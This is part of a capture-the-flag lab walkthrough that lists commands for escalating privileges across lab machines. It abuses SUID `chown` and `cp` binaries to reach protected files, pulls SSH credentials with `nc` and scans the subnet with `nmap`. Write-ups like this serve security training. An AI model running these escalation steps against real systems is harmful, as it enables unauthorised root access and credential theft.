Part2

1.  ssh to ubuntu1, look for flag5
	ex:  ssh spike@localhost -p 3210
2.  flag5 is in /home/root but the directory cannot be listed due to permissions
3.  search for some way to bypass this -- in this case, look for something useful with the suid bit set
	ex: find / -perm /4000
4.  chown seems to have the suid bit and will do what we need
	ex: chown test /home/root
5.  viewing flag5 tells us 172.16.88.87 is listening on 4321.  use nc to connect to ubuntu2, receive ssh creds
	ex: nc 172.16.88.87 4321
	***note: this only works once!  the port is bound will refuse additional connections
6.  ssh to ubuntu2 and look for flag6.  It is hidden file in /tmp
	ex: ls -R / 2>/dev/null | grep *flag
	    ls -R / 2>/dev/null | grep .*
7.  flag2 has credentials and mentions another box - nmap the subnet
	ex: nmap 172.16.88.0/24
8.  ssh to 172.16.88.99 and look for flag7.  Hint points towards finding a useful script (located in /usr/bin)
	ex: ls /usr/bin
9. Unfortunately, you can't read or execute the script to generate the last flag (flag_write.sh) but maybe
	there is some way to read the script.  Look for useful binaries here
	ex: find / -perm /4000   
10. cp seems to have the suid bit set and can be used to read the script which reveals the contents of flag7!
	ex: LFILE=/usr/bin/flag_write.sh
	    cp "$LFILE" /dev/stdout
